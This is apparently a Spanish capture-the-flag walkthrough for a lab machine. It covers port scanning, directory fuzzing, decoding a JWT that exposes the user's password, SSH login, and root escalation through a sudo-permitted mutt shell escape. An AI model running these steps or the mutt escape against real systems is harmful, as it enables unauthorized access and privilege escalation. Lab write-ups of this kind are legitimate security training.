Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.

```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 192.168.80.135 -oN escaneo
```
![alt text](image.png)

Seguida, como sólo tenemos un un puerto abierto, que no corresponde a una web, haremos lo siguiente para ve que podemos extraer de el.

```
curl 192.168.80.135:21
```
![alt text](image-1.png)

Vemos que tiene contendio de texto en el puerto ssh, por la tanto haremos un fuzzing de este puerto.

```
gobuster dir -u http://192.168.80.135:21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r --no-error -b 404,403 -x txt,html,php
```
![alt text](image-2.png)

Vemos que tenemos un archivo escondido llamado robots, por lo tanto vamos a ver que esconde.

```
curl 192.168.80.135:21/robots.txt
```
![alt text](image-3.png)

Vemos que esconde un directorio oculto, asi que vamos a abrirlo y a ver que esconde.

```
curl 192.168.80.135:21/9a618248b64db62d15b300a07b00580b
```
![alt text](image-4.png)

Vemos que muestra un enlace, que es añadirle una / a la ruta que teniamos puesta. Vamos a entrar a ver que esconde.

```
curl 192.168.80.135:21/9a618248b64db62d15b300a07b00580b/
```
![alt text](image-5.png)

Vemos que nos mustra un contenido cifrado, así que vamos a intentar descifrar el payload del json.

```
echo -n 'eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiIiwiaWQiOiIxIiwidXNlcm5hbWUiOiJtYXVybyIsInBhc3N3b3JkIjoibUB1UjAxMjMhIn0' | base64 -d | jq
```
![alt text](image-6.png)

Una vez tenemos las credenciales del usuario, entraremos y sacaremos la flag de usuario.

```
ssh mauro@192.168.80.135 -p21
password: m@uR0123!

ls
cat user.txt
```

![alt text](image-7.png)

Una vez tenemos la flag de usuario, vamos a conseguir la de root, para ello tenemos que escalar privilegios.

```
sudo -l
```
![alt text](image-8.png)

Vemos que tiene un binario con permisos de administrador, entonces vamos a explotarlo para escalar los privilegios.

```
sudo -u root /usr/bin/mutt
```
![alt text](image-9.png)
```
!
/bin/bash
```
![alt text](image-10.png)

Finalmente sacaremos la flag de root.

![alt text](image-11.png)